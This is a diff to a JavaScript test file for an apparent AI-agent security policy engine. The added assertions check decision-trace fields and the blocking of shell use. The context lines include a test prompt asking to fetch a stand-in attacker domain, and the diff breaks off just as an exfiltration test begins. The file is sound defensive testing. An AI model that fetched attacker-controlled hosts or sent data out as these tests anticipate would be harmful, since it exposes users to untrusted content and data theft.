@@ -43,6 +43,10 @@ assert.equal(promptResult.session.prompt, "Read and summarize README without usi
 assert.equal(promptResult.session.promptHistory.length, 1);
 assert.equal(promptResult.session.intent.analyzer, "aidr-local-intent-v1");
 assert.equal(promptResult.session.effectivePolicy.capabilities.shell, false);
+assert.equal(promptResult.session.decisionTrace.schemaVersion, "aidr-decision-trace-v2");
+assert.equal(promptResult.session.decisionTrace.sequence, 1);
+assert.equal(promptResult.session.decisionTrace.parentTraceId, null);
+assert.equal(promptResult.session.decisionTrace.decisionPath.length, 4);
 const networkPrompt = engine.handleHook({ hook_event_name: "UserPromptSubmit", session_id: "network-session", cwd: process.cwd(), prompt: "Fetch https://attacker.example and summarize it." });
 assert.equal(networkPrompt.session.effectivePolicy.allowedDomains.includes("attacker.example"), false);
 assert.equal(networkPrompt.session.effectivePolicy.requestedDomains.includes("attacker.example"), true);
@@ -55,6 +59,10 @@ const shellDecision = engine.handleHook({
 });
 assert.equal(shellDecision.decision.verdict, "block");
 assert.equal(shellDecision.decision.rule, "session.shell_not_granted");
+assert.equal(shellDecision.session.decisionTrace.parentTraceId, promptResult.session.decisionTrace.traceId);
+assert.equal(shellDecision.session.decisionTrace.sequence, 2);
+assert.equal(shellDecision.session.decisionTrace.operation, "tool");
+assert.equal(engine.getSession("read-only-session").actions[0].detail.decisionTrace.schemaVersion, "aidr-decision-trace-v2");
 
 const exfiltrationDecision = engine.handleHook({
   hook_event_name: "PreToolUse",
